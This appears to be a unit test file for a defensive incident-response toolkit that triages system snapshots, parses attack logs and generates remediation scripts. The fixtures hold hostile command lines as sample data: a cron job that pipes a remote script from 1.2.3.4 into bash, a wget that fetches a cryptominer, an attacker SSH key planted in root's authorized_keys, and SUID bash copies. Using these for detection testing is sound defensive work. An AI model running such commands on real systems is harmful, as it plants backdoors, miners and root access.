import unittest
import json
import os
from bluekit.resp.schema import Snapshot
from bluekit.resp.triage import analyze
from bluekit.resp.remediate import generate
from bluekit.resp.fraud import scan
from bluekit.resp.servicedoctor import diagnose

class TestResp(unittest.TestCase):
    def test_triage(self):
        with open('data/samples/resp/current_win.json') as f:
            cur = json.load(f)
        findings, _ = analyze(None, cur, protected=['checker_admin'])
        
        # assert injected items
        tasks = [f for f in findings if f['category'] == 'tasks']
        self.assertTrue(len(tasks) > 0)
        self.assertIn(tasks[0]['confidence'], ['med', 'high'])
        
        users = [f for f in findings if f['category'] == 'users']
        protected_user = [u for u in users if u['item'] == 'checker_admin'][0]
        self.assertTrue(protected_user['protected'])
        
        gen = generate(tasks[0], 'windows')
        self.assertIn('# BACKUP', gen)
        self.assertIn('# REMOVE', gen)
        self.assertIn('# VERIFY', gen)
        self.assertIn('# ROLLBACK', gen)

        # test AnyDesk finding
        anydesk_f = [f for f in findings if f['category'] == 'remote_access_tools' and f['item'] == 'AnyDesk']
        if anydesk_f:
            anydesk_gen = generate(anydesk_f[0], 'windows')
            self.assertIn('# BACKUP', anydesk_gen)
            self.assertIn('# REMOVE', anydesk_gen)
            self.assertIn('# VERIFY', anydesk_gen)
            self.assertIn('# ROLLBACK', anydesk_gen)

        # test protected item is skipped in fix
        prot_gen = generate(protected_user, 'windows')
        self.assertEqual(prot_gen, "")

        frauds = scan(cur)
        self.assertTrue(isinstance(frauds, list))
        
        diag = diagnose(cur, "Web")
        self.assertTrue(len(diag) >= 1)

    def test_logbridge(self):
        with open('data/samples/resp/current_win.json') as f:
            cur = json.load(f)
            
        logs_data = {
            "checkers": [{"src": "10.0.0.99"}],
            "timeline": [
                {
                    "ts": "2026-09-01T12:00:00Z",
                    "command_line": "schtasks /create /tn Updater /tr cmd.exe",
                    "techniques": [{"technique": "T1053.005", "confidence": "high"}]
                },
                {
                    "ts": "2026-09-01T12:05:00Z",
                    "command_line": "anydesk.exe --install",
                }
            ],
            "iocs": [{"type": "ip", "value": "10.0.0.55"}]
        }
        
        # Inject the checker IP into the snapshot as a hosts_file finding so we can test it gets protected
        cur.setdefault('hosts_file', []).append('10.0.0.99 bank.com')
        
        from bluekit.resp.logbridge import load_log_artifacts
        log_arts = load_log_artifacts(logs_data)
        findings, extra = analyze(None, cur, baseline={}, log_artifacts=log_arts)
        
        # Verify matching
        anydesk_f = [f for f in findings if f['item'] == 'AnyDesk'][0]
        self.assertTrue(anydesk_f.get('log_confirmed'))
        self.assertGreater(anydesk_f['score'], 0.7)
        
        # Verify ranking (log_confirmed first)
        self.assertTrue(findings[0].get('log_confirmed'))
        
        # Verify checker IP is NOT auto-protected, but added to advisory
        hosts_f = [f for f in findings if f['category'] == 'hosts_file' and '10.0.0.99' in f['item']][0]
        self.assertFalse(hosts_f['protected'])
        self.assertIn('10.0.0.99', extra.get('checker_candidates', []))
        
        # Verify fix output does NOT omit it automatically unless passed via --protected
        prot_gen = generate(hosts_f, 'windows')
        self.assertNotEqual(prot_gen, "")
        
        unmatched = extra.get('unmatched_log_artifacts', [])
        self.assertIsInstance(unmatched, list)
        unmatched_arts = [x['artifact'] for x in unmatched]
        self.assertNotIn('10.0.0.99', unmatched_arts)

    def test_linux_snapshot(self):
        linux_snap_path = r"D:\Claude Projects\CTF\blue-kit\data\samples\practice\snapshot_linux.json"
        with open(linux_snap_path, 'r', encoding='utf-8') as f:
            cur = json.load(f)
            
        findings, extra = analyze(None, cur, baseline=None, log_artifacts=None)
        
        cats = [f['category'] for f in findings]
        self.assertIn('cron', cats)
        self.assertIn('ssh_authorized_keys', cats)
        self.assertIn('suid_files', cats)
        
        # uid0 user
        uid0_user = [f for f in findings if f['category'] == 'users' and f['item'] == 'support']
        self.assertTrue(len(uid0_user) > 0)
        self.assertEqual(uid0_user[0]['confidence'], 'high')
        
        # miner service
        miner = [f for f in findings if f['category'] == 'services' and f['item'] == 'sysupdate']
        self.assertTrue(len(miner) > 0)
        
        # connections & C2 protected flag
        c2_conns = [f for f in findings if f['category'] == 'connections' and '185.220.101.44' in str(f['item'])]
        self.assertTrue(len(c2_conns) > 0)
        for c in c2_conns:
            self.assertFalse(c['protected'])

class TestLogbridgeLinux(unittest.TestCase):
    def _arts(self, *cmds):
        from bluekit.resp.logbridge import load_log_artifacts
        return load_log_artifacts({'timeline': [{'ts': '2026-10-06T10:00:00', 'host': 'h', 'command_line': c, 'techniques': []} for c in cmds]})

    def test_chained_chmod_does_not_leak(self):
        arts = self._arts('cp /bin/bash /tmp/rb && chmod u+s /tmp/rb; chmod +x /tmp/x.sh')
        self.assertEqual(arts['suid_paths'], {'/tmp/rb'})

    def test_cron_nested_quotes(self):
        arts = self._arts('''sh -c "echo '* * * * * echo hi' | crontab -"''')
        self.assertEqual(arts['cron_lines'], {'* * * * * echo hi'})

    def test_logbridge_parsing(self):
        from bluekit.resp.logbridge import load_log_artifacts
        
        # 1. cron
        d1 = {'timeline': [{'command_line': 'sh -c (crontab -l; echo "* * * * * curl -s http://1.2.3.4/x.sh | bash") | crontab -'}]}
        arts1 = load_log_artifacts(d1)
        self.assertEqual(len(arts1['cron_lines']), 1)
        self.assertIn('* * * * * curl -s http://1.2.3.4/x.sh | bash', arts1['cron_lines'])
        
        # 2. cron negativ
        d2 = {'timeline': [{'command_line': 'echo "hello world" > /tmp/a'}, {'command_line': 'crontab -l'}]}
        arts2 = load_log_artifacts(d2)
        self.assertEqual(len(arts2['cron_lines']), 0)
        
        # 3. suid
        d3 = {'timeline': [
            {'command_line': 'chmod u+s /tmp/rootbash'},
            {'command_line': 'chmod 4755 /tmp/a /tmp/b'},
            {'command_line': 'chmod +x /tmp/x'},
            {'command_line': 'chmod 755 /tmp/x'},
            {'command_line': 'chmod 2755 /tmp/x'},
            {'command_line': 'chmod 0755 /tmp/x'}
        ]}
        arts3 = load_log_artifacts(d3)
        self.assertEqual(len(arts3['suid_paths']), 3)
        self.assertIn('/tmp/rootbash', arts3['suid_paths'])
        self.assertIn('/tmp/a', arts3['suid_paths'])
        self.assertIn('/tmp/b', arts3['suid_paths'])
        
        # 4. ssh
        d4 = {'timeline': [
            {'command_line': 'echo ssh-rsa AAAAB3NzaC1yc2attacker root@evil >> /root/.ssh/authorized_keys'},
            {'command_line': 'cat /root/.ssh/authorized_keys'}
        ]}
        arts4 = load_log_artifacts(d4)
        self.assertEqual(len(arts4['ssh_keys']), 1)
        self.assertIn('AAAAB3NzaC1yc2attacker', arts4['ssh_keys'])

    def test_logbridge_triage(self):
        from bluekit.resp.logbridge import load_log_artifacts
        from bluekit.resp.triage import analyze
        
        # 5. Linux snapshot: cron
        snap_cron = {'cron': [{'user':'root','line':'* * * * * curl -s http://1.2.3.4/x.sh | bash','file':'/var/spool/cron/crontabs/root'}]}
        d1 = {'timeline': [{'ts':'2026-10-06T10:00:00','host':'web01','user':'root', 'command_line': 'sh -c (crontab -l; echo "* * * * * curl -s http://1.2.3.4/x.sh | bash") | crontab -', 'techniques':[]}]}
        arts = load_log_artifacts(d1)
        findings, _ = analyze(None, snap_cron, baseline=None, protected=None, log_artifacts=arts)
        self.assertEqual(len(findings), 1)
        self.assertTrue(findings[0].get('log_confirmed'))
        
        # negative cron
        findings_neg, _ = analyze(None, snap_cron, baseline=None, protected=None, log_artifacts=load_log_artifacts({'timeline':[]}))
        self.assertEqual(len(findings_neg), 1)
        self.assertFalse(findings_neg[0].get('log_confirmed', False))
        
        # 6. suid
        snap_suid = {'suid_files': ['/tmp/rootbash', '/tmp/other', '/tmp/a/bash']}
        d3 = {'timeline': [
            {'ts':'2026-10-06T10:00:00','host':'web01','user':'root', 'command_line': 'chmod u+s /tmp/rootbash'},
            {'ts':'2026-10-06T10:00:00','host':'web01','user':'root', 'command_line': 'chmod u+s /usr/bin/bash'}
        ]}
        arts3 = load_log_artifacts(d3)
        findings3, _ = analyze(None, snap_suid, baseline=None, protected=None, log_artifacts=arts3)
        suid_findings = [f for f in findings3 if f['category'] == 'suid_files']
        self.assertEqual(len(suid_findings), 3)
        for f in suid_findings:
            if f['item'] == '/tmp/rootbash':
                self.assertTrue(f.get('log_confirmed'))
            else:
                self.assertFalse(f.get('log_confirmed', False))
                
        # 9. Tartib-mustaqillik
        snap_suid_rev = {'suid_files': ['/tmp/other', '/tmp/rootbash']}
        findings_rev, _ = analyze(None, snap_suid_rev, baseline=None, protected=None, log_artifacts=arts3)
        for f in findings_rev:
            if f['item'] == '/tmp/rootbash':
                self.assertTrue(f.get('log_confirmed'))
            else:
                self.assertFalse(f.get('log_confirmed', False))

        # 7. ssh
        snap_ssh = {'ssh_authorized_keys': [{'user':'root','file':'/root/.ssh/authorized_keys','key_fingerprint_or_line':'ssh-rsa AAAAB3NzaC1yc2attacker root@evil'}, {'user':'root','file':'/root/.ssh/authorized_keys','key_fingerprint_or_line':'ssh-rsa AAAAB3NzaC1yc2different'}]}
        d4 = {'timeline': [{'ts':'2026-10-06T10:00:00','host':'web01','user':'root', 'command_line': 'echo ssh-rsa AAAAB3NzaC1yc2attacker root@evil >> /root/.ssh/authorized_keys'}]}
        arts4 = load_log_artifacts(d4)
        findings4, _ = analyze(None, snap_ssh, baseline=None, protected=None, log_artifacts=arts4)
        ssh_findings = [f for f in findings4 if f['category'] == 'ssh_authorized_keys']
        self.assertEqual(len(ssh_findings), 2)
        for f in ssh_findings:
            if 'root@evil' in f['item']:
                self.assertTrue(f.get('log_confirmed'))
            else:
                self.assertFalse(f.get('log_confirmed', False))

        # 8. autorun
        snap_auto = {'autoruns': [{'location':'/etc/systemd/system/sysupdate.service','name':'sysupdate','value':'/tmp/.x/xmrig -o stratum+tcp://1.2.3.4:3333'}]}
        d_auto = {'timeline': [{'ts':'2026-10-06T10:00:00','host':'web01','user':'root', 'command_line': 'wget http://1.2.3.4/xmrig -O /tmp/.x/xmrig'}]}
        arts_auto = load_log_artifacts(d_auto)
        findings_auto, _ = analyze(None, snap_auto, baseline=None, protected=None, log_artifacts=arts_auto)
        auto_findings = [f for f in findings_auto if f['category'] == 'autoruns']
        self.assertEqual(len(auto_findings), 1)
        self.assertTrue(auto_findings[0].get('log_confirmed'))


if __name__ == '__main__':
    unittest.main()
